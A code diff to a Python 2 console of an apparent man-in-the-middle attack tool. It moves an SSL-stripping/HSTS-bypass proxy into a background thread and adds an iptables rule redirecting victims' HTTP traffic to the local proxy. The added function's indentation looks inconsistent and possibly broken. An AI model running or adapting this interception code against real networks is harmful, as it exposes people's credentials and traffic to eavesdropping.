@@ -28,6 +28,7 @@ import os,sys
 import termcolor
 import readline
 import psutil
+import threading
 from time import sleep
 class Processor(object):
 	name = "Interface-Processor"
@@ -95,7 +96,6 @@ class Processor(object):
 				self.command = raw_input("{} ".format(console))
 					# Separate the user input by spaces " ", can use like this too: self.input_list = [str(a) for a in self.argv] 
 				self.input_list = self.command.split()
-
 				try:
 
 						# HELP
@@ -118,15 +118,20 @@ class Processor(object):
 
 						# HSTSBYPASS
 					elif self.command == "hstsbypass":
+						from modules.sslkill import Proxy,SSLKiller,SSLStripRequestHandler
+						def HSTSbypass():
+        		                        	sslkill = SSLKiller(self.interface, self.targets, self.gateway)
+        		                                Proxy(HandlerClass=SSLStripRequestHandler)
 						if self.targets and self.gateway and self.interface:
 							try:
-								from modules.sslkill import Proxy,SSLKiller,SSLStripRequestHandler
 								self.sslkill_status = True
-						                sslkill = SSLKiller(self.interface, self.targets, self.gateway)
                 						os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-                						Proxy(HandlerClass=SSLStripRequestHandler)
-								print "[*] SSLKill initialized"
-								print "      |_by: m4n3dw0lf"
+								ht = threading.Thread(name='HSTSbypass', target=HSTSbypass)
+								ht.setDaemon(True)
+								ht.start()
+								sleep(5)
+								#print "[*] SSLKill initialized"
+								#print "      |_by: m4n3dw0lf"
 							except Exception as e:
 								print "[!] Exception caught: {}".format(e)
 
